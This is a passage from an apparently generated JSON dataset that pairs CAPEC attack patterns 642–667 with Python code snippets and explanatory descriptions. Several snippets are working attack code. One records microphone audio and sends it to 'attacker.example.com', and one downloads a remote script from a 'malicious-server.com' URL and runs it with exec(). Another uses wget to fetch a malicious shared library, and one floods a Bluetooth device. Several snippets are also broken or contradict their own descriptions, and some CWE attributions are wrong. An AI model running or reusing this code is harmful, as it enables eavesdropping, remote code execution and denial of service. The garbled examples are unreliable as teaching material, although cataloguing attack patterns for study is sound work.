        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\nimport shutil\n\n# Path to the binary that will be replaced\nbinary_path = '/usr/local/bin/target_binary'\n\n# Path to the malicious binary\nmalicious_binary_path = '/tmp/malicious_binary'\n\n# Check if the binary exists and has weak permissions\nif os.path.exists(binary_path) and os.access(binary_path, os.W_OK):\n    # Replace the binary with the malicious one\n    shutil.copy(malicious_binary_path, binary_path)\n    print(f'Replaced {binary_path} with malicious binary.')\nelse:\n    print(f'Cannot replace {binary_path}. Either it does not exist or lacks write permissions.')",
        "description": "This Python code snippet demonstrates a potential security vulnerability where an attacker replaces a legitimate binary with a malicious one. The code first checks if the target binary exists and has weak file permissions (i.e., it is writable). If these conditions are met, the code replaces the target binary with a malicious binary. This embodies the CAPEC 'Replace Binaries' by exploiting weak file permissions (CWE-732) to replace critical resources. The code also touches on CWE-426 and CWE-428 by assuming the binary is in a predictable location and not properly protected. This example highlights the importance of securing file permissions to prevent unauthorized modifications."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import os\n\n# CWE-552: Files or Directories Accessible to External Parties\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-427: Uncontrolled Search Path Element\n# CWE-40: Path Traversal: '\\\\UNC\\share\\name\\' (Windows UNC Share)\n\ndef list_shared_directories(base_path):\n    try:\n        # CWE-40: Potentially dangerous path traversal\n        if not os.path.isabs(base_path):\n            raise ValueError(\"Base path must be absolute\")\n\n        # CWE-552: Making directories accessible to unauthorized actors\n        for root, dirs, files in os.walk(base_path):\n            for dir_name in dirs:\n                dir_path = os.path.join(root, dir_name)\n                print(f\"Shared Directory: {dir_path}\")\n                # CWE-200: Potential exposure of sensitive information\n                for file_name in os.listdir(dir_path):\n                    file_path = os.path.join(dir_path, file_name)\n                    if os.path.isfile(file_path):\n                        print(f\"  Contains file: {file_path}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nlist_shared_directories('C:\\\\Users\\\\Public')",
        "description": "This Python code snippet demonstrates the identification of shared directories on a system, which aligns with the CAPEC description of discovering connections between systems by exploiting shared folders/drives. The function `list_shared_directories` takes an absolute base path and recursively lists all directories and files within it. The code includes potential vulnerabilities such as CWE-552 (making directories accessible to unauthorized actors), CWE-267 (unsafe actions with privileges), CWE-200 (exposure of sensitive information), CWE-427 (uncontrolled search path element), and CWE-40 (path traversal). The example usage shows how to call the function with a base path, potentially exposing shared directories and their contents."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import hashlib\nimport os\n\n# Simulate storing password hashes\nstored_hashes = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # hash for 'password'\n}\n\n# Function to authenticate using password hash\ndef authenticate(username, password_hash):\n    if username in stored_hashes and stored_hashes[username] == password_hash:\n        return True\n    return False\n\n# Simulate an attacker capturing a hash\ncaptured_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\n\n# Attacker replays the captured hash\nif authenticate('user1', captured_hash):\n    print('Authentication successful')\nelse:\n    print('Authentication failed')",
        "description": "This Python code snippet demonstrates a simplified version of the 'Use of Captured Hashes (Pass The Hash)' attack. The code stores password hashes and uses them for authentication. An attacker captures a legitimate password hash and replays it to authenticate as the user. This example highlights the vulnerabilities associated with storing and using password hashes directly (CWE-836), insufficiently protected credentials (CWE-522), and the risk of capture-replay attacks (CWE-294). The code also implicitly shows the risk of single-factor authentication (CWE-308) as it does not use any additional authentication factors."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import socket\nimport ssl\n\n# Simulate insecure storage of credentials\ncredentials = {'username': 'admin', 'password': 'password123'}\n\n# Simulate insecure transmission of credentials\ndef send_credentials(credentials):\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n\n    with socket.create_connection(('example.com', 443)) as sock:\n        with context.wrap_socket(sock, server_hostname='example.com') as ssock:\n            ssock.sendall(f\"{credentials['username']}:{credentials['password']}\".encode())\n\n# Simulate capture and replay attack\ncaptured_ticket = \"captured_ticket_data\"\n\ndef replay_attack(ticket):\n    with socket.create_connection(('example.com', 443)) as sock:\n        with context.wrap_socket(sock, server_hostname='example.com') as ssock:\n            ssock.sendall(ticket.encode())\n\n# Send credentials insecurely\nsend_credentials(credentials)\n\n# Replay captured ticket\nreplay_attack(captured_ticket)",
        "description": "This Python code snippet demonstrates a simplified scenario of the 'Use of Captured Tickets (Pass The Ticket)' attack. It includes insecure storage and transmission of credentials, which aligns with CWE-522 (Insufficiently Protected Credentials) and CWE-294 (Authentication Bypass by Capture-replay). The `send_credentials` function transmits credentials over an SSL connection without proper hostname verification, making it susceptible to interception. The `replay_attack` function simulates a capture-replay attack by sending a captured ticket to the server, bypassing authentication. This code highlights the risks associated with insecure credential handling and the potential for replay attacks in systems using single-factor authentication."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import os\nimport winreg\n\n# Function to get list of USB devices from Windows registry\ndef get_usb_devices():\n    usb_devices = []\n    try:\n        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n        key = winreg.OpenKey(reg, r'SYSTEM\\CurrentControlSet\\Enum\\USBSTOR')\n        for i in range(0, winreg.QueryInfoKey(key)[0]):\n            device = winreg.EnumKey(key, i)\n            usb_devices.append(device)\n    except Exception as e:\n        print(f\"Error accessing registry: {e}\")\n    return usb_devices\n\n# Function to check for iOS backups\ndef check_ios_backups():\n    ios_backup_path = os.path.expanduser('~\\AppData\\Roaming\\Apple Computer\\MobileSync\\Backup')\n    if os.path.exists(ios_backup_path):\n        return os.listdir(ios_backup_path)\n    return []\n\n# Main function to gather peripheral information\ndef gather_peripheral_info():\n    usb_devices = get_usb_devices()\n    ios_backups = check_ios_backups()\n    return {'usb_devices': usb_devices, 'ios_backups': ios_backups}\n\n# Example usage\nif __name__ == '__main__':\n    peripheral_info = gather_peripheral_info()\n    print(peripheral_info)",
        "description": "This Python code snippet demonstrates how an adversary might gather information about peripheral devices connected to a Windows system, embodying the concept of 'Peripheral Footprinting' (CAPEC). The code includes two main functions: `get_usb_devices` and `check_ios_backups`. The `get_usb_devices` function accesses the Windows registry to list USB devices that have been connected to the system, which relates to CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The `check_ios_backups` function checks for the presence of iOS backups in a typical directory, which could expose sensitive information (CWE-200). The `gather_peripheral_info` function combines these methods to provide a summary of connected peripherals, which could be useful for an adversary planning further attacks."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef collect_registry_data():\n    try:\n        registry_path = r'SOFTWARE\\SensitiveApp'\n        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path, 0, winreg.KEY_READ)\n        value, regtype = winreg.QueryValueEx(registry_key, 'SensitiveData')\n        print(f'Sensitive Data: {value}')\n        winreg.CloseKey(registry_key)\n    except Exception as e:\n        print(f'Error accessing registry: {e}')\n\nif __name__ == '__main__':\n    collect_registry_data()",
        "description": "This Python code snippet demonstrates how an adversary might exploit improper authorization and cleartext storage in the Windows Registry to collect sensitive data. The function `collect_registry_data` attempts to read a registry key that contains sensitive information ('SensitiveData') from a specific path ('SOFTWARE\\SensitiveApp'). If successful, it prints the sensitive data. This example highlights vulnerabilities such as improper authorization (CWE-285), cleartext storage in the registry (CWE-314), and exposure of sensitive system information (CWE-497). The code assumes that the adversary has sufficient privileges to access the registry key, which may not be properly protected."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport time\nimport os\n\n# Function to capture screenshots\ndef capture_screenshots(interval, duration, save_path):\n    end_time = time.time() + duration\n    while time.time() < end_time:\n        screenshot = pyautogui.screenshot()\n        timestamp = int(time.time())\n        screenshot.save(os.path.join(save_path, f'screenshot_{timestamp}.png'))\n        time.sleep(interval)\n\n# Example usage\nif __name__ == '__main__':\n    save_path = './screenshots'\n    os.makedirs(save_path, exist_ok=True)\n    capture_screenshots(interval=5, duration=60, save_path=save_path)",
        "description": "This Python code snippet demonstrates how an adversary might exploit the system's screen capture functionality to gather sensitive information. The `capture_screenshots` function takes screenshots at regular intervals (every 5 seconds) for a specified duration (60 seconds) and saves them to a specified directory. This can be used to monitor and capture sensitive information displayed on the screen over time. The code embodies the CAPEC 'Collect Data from Screen Capture' and highlights potential vulnerabilities such as CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by not restricting access to the screenshot functionality, and CWE-267 (Privilege Defined With Unsafe Actions) by allowing the screen capture to be performed without proper privilege checks."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import os\n\n# Function to check file extension\ndef is_safe_file(file_path):\n    allowed_extensions = ['.txt', '.jpg', '.png']\n    file_extension = os.path.splitext(file_path)[1]\n    if file_extension in allowed_extensions:\n        return True\n    return False\n\n# Example usage\nfile_path = 'example.txt '\nif is_safe_file(file_path):\n    print('File is safe to process.')\nelse:\n    print('File is not safe to process.')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-Adding a Space to a File Extension and related CWEs. The function `is_safe_file` checks if a file has an allowed extension by splitting the file path and checking the extension against a list of allowed extensions. However, the code does not properly handle trailing spaces in the file name (e.g., 'example.txt '), which can lead to incorrect classification of the file type. This vulnerability can be exploited by an attacker to bypass security checks and potentially execute malicious files. The code highlights the importance of properly sanitizing and validating file names to prevent such attacks."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import os\nfrom flask import Flask, request, redirect, url_for\nfrom werkzeug.utils import secure_filename\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/upload'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        # Check if the post request has the file part\n        if 'file' not in request.files:\n            return 'No file part'\n        file = request.files['file']\n        # If the user does not select a file, the browser submits an empty file without a filename\n        if file.filename == '':\n            return 'No selected file'\n        # Save the file without proper validation\n        filename = secure_filename(file.filename)\n        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n        return 'File successfully uploaded'\n    return '''\n    <!doctype html>\n    <title>Upload new File</title>\n    <h1>Upload new File</h1>\n    <form method=post enctype=multipart/form-data>\n      <input type=file name=file>\n      <input type=submit value=Upload>\n    </form>\n    '''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a basic file upload functionality using the Flask web framework. The code allows users to upload files to a specified directory on the server. However, it lacks proper validation and security measures, making it vulnerable to several issues described in the CAPEC and related CWEs. Specifically, it allows unrestricted upload of files (CWE-434), which could include dangerous types like web shells. If an attacker uploads a malicious file, it could be executed on the server, potentially leading to unauthorized access and command execution (CWE-553). The code also does not implement proper authentication (CWE-287) or server-side security enforcement (CWE-602), further increasing the risk of exploitation."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import sounddevice as sd\nimport numpy as np\nimport socket\n\n# Parameters\nDURATION = 10  # seconds\nFS = 44100  # Sample rate\nHOST = 'attacker.example.com'  # Attacker's server\nPORT = 12345  # Port to send data\n\n# Record audio\nprint('Recording...')\nrecording = sd.rec(int(DURATION * FS), samplerate=FS, channels=2, dtype='int16')\nsd.wait()\nprint('Recording complete')\n\n# Convert recording to bytes\naudio_data = recording.tobytes()\n\n# Send recorded audio to attacker\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n    s.connect((HOST, PORT))\n    s.sendall(audio_data)\n\nprint('Audio data sent to attacker')",
        "description": "This Python code snippet demonstrates a basic eavesdropping attack by recording audio from the microphone and sending the captured data to an attacker's server. The code uses the 'sounddevice' library to record audio for a specified duration and then sends the recorded audio data over a network socket to a predefined host and port. This embodies the CAPEC concept of eavesdropping by capturing raw audio communication and transmitting it to an unauthorized actor. The code also touches on related CWEs such as 'Exposure of Sensitive Information to an Unauthorized Actor' (CWE-200) and 'Cleartext Transmission of Sensitive Information' (CWE-319) by sending the audio data without encryption."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import socket\nimport ssl\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Simulate a Kerberos authentication request\nclass KerberosClient:\n    def __init__(self, server_address, username, password):\n        self.server_address = server_address\n        self.username = username\n        self.password = password\n\n    def authenticate(self):\n        context = ssl.create_default_context()\n        with socket.create_connection(self.server_address) as sock:\n            with context.wrap_socket(sock, server_hostname=self.server_address[0]) as ssock:\n                # Send username and password (CWE-522)\n                ssock.sendall(f'{self.username}:{self.password}'.encode('utf-8'))\n                # Receive and print the server response\n                response = ssock.recv(1024)\n                print('Server response:', response.decode('utf-8'))\n\n# Example usage\nclient = KerberosClient(('localhost', 88), 'user', 'password')\nclient.authenticate()",
        "description": "This Python code snippet simulates a Kerberos authentication request using a simple client-server model. The KerberosClient class is initialized with a server address, username, and password. The authenticate method establishes a secure connection to the server using SSL and sends the username and password for authentication. This code embodies the main idea of CAPEC-Use of Known Kerberos Credentials by demonstrating how an adversary might use stolen credentials to gain authenticated access. The code also highlights several related CWEs: CWE-522 (Insufficiently Protected Credentials) by transmitting credentials in plaintext, CWE-308 (Use of Single-factor Authentication) by relying solely on username and password, and CWE-294 (Authentication Bypass by Capture-replay) by not implementing measures to prevent replay attacks."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import os\nimport getpass\n\n# Hardcoded credentials (CWE-522)\nUSERNAME = 'admin'\nPASSWORD = 'password123'\n\n# Function to authenticate user\ndef authenticate(username, password):\n    # Single-factor authentication (CWE-308)\n    if username == USERNAME and password == PASSWORD:\n        print('Authentication successful!')\n        return True\n    else:\n        print('Authentication failed!')\n        return False\n\n# Main function\nif __name__ == '__main__':\n    # Get credentials from user\n    user = input('Enter username: ')\n    pwd = getpass.getpass('Enter password: ')\n\n    # Attempt to authenticate\n    if authenticate(user, pwd):\n        # Simulate authorized action\n        print('Performing authorized action...')\n    else:\n        print('Access denied.')",
        "description": "This Python code snippet demonstrates a simple authentication mechanism that embodies the main idea of CAPEC-Use of Known Operating System Credentials. The code uses hardcoded credentials (CWE-522) and single-factor authentication (CWE-308) to authenticate a user. The user is prompted to enter a username and password, which are then checked against the hardcoded values. If the credentials match, the user is authenticated and an authorized action is performed. This code is vulnerable because it relies on hardcoded credentials and single-factor authentication, making it susceptible to unauthorized access if the credentials are guessed or obtained by an adversary."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import tkinter as tk\nfrom tkinter import simpledialog\n\n# CWE-798: Use of Hard-coded Credentials\nHARDCODED_USERNAME = 'admin'\nHARDCODED_PASSWORD = 'password123'\n\n# Function to simulate credential prompt impersonation\ndef fake_credential_prompt():\n    root = tk.Tk()\n    root.withdraw()  # Hide the main window\n\n    # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n    # Display a fake credential prompt\n    username = simpledialog.askstring('Login', 'Enter your username:')\n    password = simpledialog.askstring('Login', 'Enter your password:', show='*')\n\n    # CWE-522: Insufficiently Protected Credentials\n    # Print credentials to console (simulating credential theft)\n    print(f'Captured credentials - Username: {username}, Password: {password}')\n\n    root.destroy()\n\n# CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation\n# Simulate running the application with elevated privileges\nif __name__ == '__main__':\n    print('Running with elevated privileges...')\n    fake_credential_prompt()",
        "description": "This Python code snippet demonstrates a simple example of credential prompt impersonation, where a malicious application creates a fake login prompt to steal user credentials. The code uses Tkinter to create a GUI prompt that asks for a username and password. The credentials are then printed to the console, simulating theft. The code also includes hard-coded credentials (CWE-798) and simulates running with elevated privileges (CWE-556). The fake prompt does not properly restrict UI layers (CWE-1021) and does not protect the captured credentials (CWE-522), embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-541: Inclusion of Sensitive Information in an Include File\n# CWE-532: Insertion of Sensitive Information into Log File\n\n# Create a temporary file\nwith tempfile.NamedTemporaryFile(delete=False) as temp_file:\n    temp_file_name = temp_file.name\n    # CWE-541: Including sensitive information in the file\n    temp_file.write(b'username=admin\\npassword=secret\\n')\n\n# CWE-434: Unrestricted upload of a dangerous file type\nuploaded_file_name = 'malicious_script.sh'\nwith open(uploaded_file_name, 'w') as uploaded_file:\n    uploaded_file.write('#!/bin/bash\\necho \"Malicious code executed\"\\n')\n\n# CWE-532: Insertion of sensitive information into log file\nlog_file_name = 'application.log'\nwith open(log_file_name, 'a') as log_file:\n    log_file.write(f'Uploaded file: {uploaded_file_name}\\n')\n    log_file.write(f'Temporary file created: {temp_file_name}\\n')\n\n# CAPEC: Avoid Security Tool Identification by Adding Data\n# Add data to the file to increase its size and change its hash\nwith open(uploaded_file_name, 'a') as uploaded_file:\n    uploaded_file.write('A' * 1000000)  # Add 1MB of data to the file\n\nprint(f'Uploaded file: {uploaded_file_name}')\nprint(f'Temporary file: {temp_file_name}')\nprint(f'Log file: {log_file_name}')",
        "description": "This Python code snippet demonstrates several security weaknesses and the main idea of the CAPEC. It creates an insecure temporary file (CWE-377) and includes sensitive information in it (CWE-541). It then simulates the unrestricted upload of a dangerous file type (CWE-434) by creating a shell script. Sensitive information is logged (CWE-532) by writing details about the uploaded and temporary files to a log file. Finally, to embody the CAPEC, the code adds a large amount of data to the uploaded file to increase its size and change its hash, potentially avoiding detection by security tools."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import random\n\nclass VoicePhishingSimulator:\n    def __init__(self):\n        self.legitimate_numbers = ['800-123-4567', '800-987-6543']\n        self.sensitive_info = {'password': 'supersecret', 'ssn': '123-45-6789'}\n\n    def receive_call(self, caller_id):\n        if caller_id not in self.legitimate_numbers:\n            print('Warning: Caller ID not recognized!')\n        else:\n            self.request_sensitive_info()\n\n    def request_sensitive_info(self):\n        attempts = 0\n        while attempts < 3:\n            info = input('Please provide your password: ')\n            if info == self.sensitive_info['password']:\n                print('Access granted.')\n                return\n            else:\n                print('Incorrect password. Try again.')\n                attempts += 1\n        print('Too many failed attempts. Access denied.')\n\n# Simulate a voice phishing attack\nsimulator = VoicePhishingSimulator()\ncaller_id = random.choice(['800-123-4567', '800-000-0000'])  # Randomly choose a legitimate or illegitimate number\nsimulator.receive_call(caller_id)",
        "description": "This Python code snippet simulates a voice phishing attack scenario. The `VoicePhishingSimulator` class contains a list of legitimate phone numbers and some sensitive information. The `receive_call` method checks if the incoming call's caller ID is from a legitimate number. If not, it warns the user. If the caller ID is legitimate, it proceeds to request sensitive information (e.g., a password). The `request_sensitive_info` method allows up to three attempts to enter the correct password before denying access. This code demonstrates vulnerabilities such as improper verification of the source of a communication channel (CWE-940), insufficient protection against excessive authentication attempts (CWE-307), and exposure of private personal information (CWE-359)."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import requests\n\n# URL of the malicious update server\nmalicious_update_url = 'http://malicious-server.com/update'\n\n# Function to download and execute the update\ndef download_and_execute_update(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download update')\n\n# Simulate a spoofed update trigger\nspoofed_update_trigger = '<script>download_and_execute_update(\"' + malicious_update_url + '\")</script>'\n\n# Execute the spoofed update trigger\nexec(spoofed_update_trigger)\n",
        "description": "This Python code snippet demonstrates a malicious automated software update via spoofing. The code simulates a scenario where an attacker tricks a client into downloading and executing a malicious update from a spoofed source. The 'download_and_execute_update' function downloads code from a specified URL and executes it without verifying its integrity or origin (CWE-494). The 'spoofed_update_trigger' simulates a cross-site scripting (XSS) attack (CWE-79) that embeds a script to trigger the malicious update. This code embodies the main idea of CAPEC-494 by showing how an attacker can use spoofing to deliver and execute malicious updates on a client system."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-494: Download of Code Without Integrity Check\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n\n# Simulate downloading a library from an untrusted source\nuntrusted_library_url = 'http://untrusted-source.com/malicious.so'\nlocal_path = '/tmp/malicious.so'\nos.system(f'wget {untrusted_library_url} -O {local_path}')\n\n# Load the untrusted library\nmalicious_lib = ctypes.CDLL(local_path)\n\n# Hooking a function to bypass Root/Jailbreak detection\n# Assume the original function is 'is_device_rooted' and we replace it with our own\noriginal_function = malicious_lib.is_device_rooted\n\ndef fake_is_device_rooted():\n    return False  # Always return False to bypass detection\n\n# Replace the original function with the fake one\nctypes.CDLL.is_device_rooted = fake_is_device_rooted\n\n# Now any call to is_device_rooted will use the fake function\nif not ctypes.CDLL.is_device_rooted():\n    print('Device is not rooted. Access granted.')\nelse:\n    print('Device is rooted. Access denied.')",
        "description": "This Python code snippet demonstrates a scenario where an adversary evades Root/Jailbreak detection by hooking a function in a mobile application. The code simulates downloading a malicious library from an untrusted source (CWE-494) and loading it into the application (CWE-829). It then hooks the 'is_device_rooted' function to always return False, thereby bypassing the Root/Jailbreak detection. This allows the adversary to gain unauthorized access to the application (CWE-497). The use of 'os.system' to download the library also introduces a potential OS command injection vulnerability (CWE-78)."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import os\nimport sys\nimport ctypes\n\ndef is_debugger_present():\n    return ctypes.windll.kernel32.IsDebuggerPresent() != 0\n\ndef check_root_jailbreak():\n    # Check for common root/jailbreak indicators\n    root_indicators = ['/system/bin/su', '/system/xbin/su', '/system/app/Superuser.apk']\n    for indicator in root_indicators:\n        if os.path.exists(indicator):\n            return True\n    return False\n\ndef main():\n    if is_debugger_present():\n        print('Debugger detected! Exiting...')\n        sys.exit(1)\n    if check_root_jailbreak():\n        print('Root/Jailbreak detected! Exiting...')\n        sys.exit(1)\n    print('Application running normally.')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a basic implementation of root/jailbreak detection and debugger presence check, which are common security measures in mobile applications. The `is_debugger_present` function uses the Windows API to check if a debugger is attached to the process, while the `check_root_jailbreak` function looks for common indicators of a rooted or jailbroken device. If either condition is detected, the application exits. This code embodies the main idea of CAPEC-Root/Jailbreak Detection Evasion via Debugging by showing how an adversary might attempt to bypass these checks to gain unauthorized access or control. The related CWEs highlight potential weaknesses such as active debug code (CWE-489) and exposure of sensitive system information (CWE-497), which this code aims to mitigate."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\nexec(response.text)\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\nuser_authenticated = False\nif 'authenticated' in response.text:\n    user_authenticated = True\n\n# CWE-300: Channel Accessible by Non-Endpoint\nif user_authenticated:\n    print('Access granted to sensitive data')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit vulnerabilities in a web browser to manipulate traffic between two endpoints. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494). It then relies on client-side enforcement to determine if a user is authenticated (CWE-602). Finally, it checks if the user is authenticated and grants access to sensitive data, representing a channel that can be accessed by a non-endpoint (CWE-300). This embodies the main idea of the CAPEC 'Adversary in the Browser (AiTB)' by showing how an attacker can manipulate browser traffic and exploit these weaknesses."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "import time\nimport numpy as np\n\n# Simulate a cache side-channel attack using speculative execution\nsecret_data = 42\ncache = np.zeros(256)\n\n# Function that simulates speculative execution\ndef speculative_execution(index):\n    if index < len(cache):\n        return cache[index]\n    return 0\n\n# Function to access secret data speculatively\ndef access_secret_data():\n    # Speculative execution path\n    for i in range(256):\n        speculative_execution(i)\n    # Access secret data\n    secret_index = secret_data * 2\n    speculative_execution(secret_index)\n\n# Function to measure access time to detect cache hits\ndef measure_access_time(index):\n    start = time.time()\n    _ = cache[index]\n    end = time.time()\n    return end - start\n\n# Simulate the attack\naccess_secret_data()\n\n# Measure access times to infer secret data\naccess_times = [measure_access_time(i) for i in range(256)]\n\n# Infer the secret data based on access times\ninferred_secret = np.argmin(access_times) // 2\nprint(f\"Inferred secret data: {inferred_secret}\")",
        "description": "This Python code snippet simulates a cache side-channel attack leveraging speculative execution, embodying the main idea of CAPEC-Exploitation of Transient Instruction Execution. The code uses speculative execution to access secret data and then measures cache access times to infer the secret value. This represents the exploitation of hardware design flaws (CWE-1037, CWE-1303, CWE-1264, CWE-1420, CWE-1342) where transient execution can expose sensitive information through microarchitectural state changes."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import requests\n\n# Vulnerable function that takes a URL from user input and fetches data from it\ndef fetch_data_from_url(user_input_url):\n    try:\n        response = requests.get(user_input_url)\n        return response.text\n    except requests.RequestException as e:\n        return str(e)\n\n# Example usage\nuser_input_url = input('Enter the URL to fetch data from: ')\nprint(fetch_data_from_url(user_input_url))",
        "description": "This Python code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The function `fetch_data_from_url` takes a URL provided by the user and makes a request to that URL using the `requests` library. The response from the request is then returned and printed. This code is vulnerable because it does not validate the user input URL, allowing an attacker to craft a malicious URL that could force the server to make requests to internal services or external third parties with the server's privileges. This embodies the main idea of CAPEC-918 (SSRF) and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import os\nimport struct\n\n# CWE-1188: Initialization of a Resource with an Insecure Default\nDEFAULT_AUTH_KEY = b'0000'  # Insecure default key\n\n# CWE-345: Insufficient Verification of Data Authenticity\n# CWE-353: Missing Support for Integrity Check\n# CWE-862: Missing Authorization\n# CWE-288: Authentication Bypass Using an Alternate Path or Channel\ndef manipulate_firmware(spi_device, firmware_data):\n    # Simulate SPI flash manipulation\n    with open(spi_device, 'wb') as spi_flash:\n        spi_flash.write(firmware_data)\n\n    # Bypass authentication by using insecure default key\n    if authenticate(DEFAULT_AUTH_KEY):\n        print('Authentication bypassed using default key.')\n        # Modify memory or extract data\n        memory_content = read_memory(spi_device)\n        print(f'Memory content: {memory_content}')\n    else:\n        print('Authentication failed.')\n\n\ndef authenticate(key):\n    # Simulate an insecure authentication check\n    return key == DEFAULT_AUTH_KEY\n\n\ndef read_memory(spi_device):\n    # Simulate reading memory content\n    with open(spi_device, 'rb') as spi_flash:\n        return spi_flash.read()\n\n# Example usage\nspi_device = 'spi_flash.bin'\nfirmware_data = struct.pack('1024s', b'New Firmware Data')\n\n# Manipulate firmware to exploit vulnerabilities\nmanipulate_firmware(spi_device, firmware_data)",
        "description": "This Python code snippet simulates the exploitation of Thunderbolt protection flaws by manipulating the firmware of a Thunderbolt controller. The code demonstrates several vulnerabilities: CWE-1188 (Initialization of a Resource with an Insecure Default) by using a default authentication key, CWE-345 (Insufficient Verification of Data Authenticity) and CWE-353 (Missing Support for Integrity Check) by not verifying the authenticity or integrity of the firmware data, CWE-862 (Missing Authorization) by not performing an authorization check, and CWE-288 (Authentication Bypass Using an Alternate Path or Channel) by bypassing authentication using the insecure default key. The `manipulate_firmware` function simulates writing to the SPI flash and bypassing authentication to read and print memory content, representing the main idea of the CAPEC."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import bluetooth\nimport time\n\n# Function to flood a Bluetooth device with large packets\ndef bluesmack_attack(target_address):\n    sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\n    sock.connect((target_address, 0x1001))  # L2CAP PSM for RFCOMM\n    large_packet = b'A' * 60000  # Large packet to flood the target\n    try:\n        while True:\n            sock.send(large_packet)\n            time.sleep(0.01)  # Short delay to maintain the flood\n    except Exception as e:\n        print(f\"Error: {e}\")\n    finally:\n        sock.close()\n\n# Example usage\nif __name__ == '__main__':\n    target = '00:11:22:33:44:55'  # Replace with the target Bluetooth address\n    bluesmack_attack(target)",
        "description": "This Python code snippet demonstrates a BlueSmacking attack, where an adversary floods a Bluetooth-enabled device with large packets over the L2CAP protocol to create a Denial of Service (DoS) condition. The code uses the `bluetooth` library to create an L2CAP socket and repeatedly sends large packets to the target device. The `time.sleep(0.01)` introduces a short delay to maintain the flood. This attack must be carried out in close proximity to the target device. The code also highlights CWE-404 (Improper Resource Shutdown or Release) by not properly handling the socket resource in case of an exception, and CWE-319 (Cleartext Transmission of Sensitive Information) as the data is sent in cleartext."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
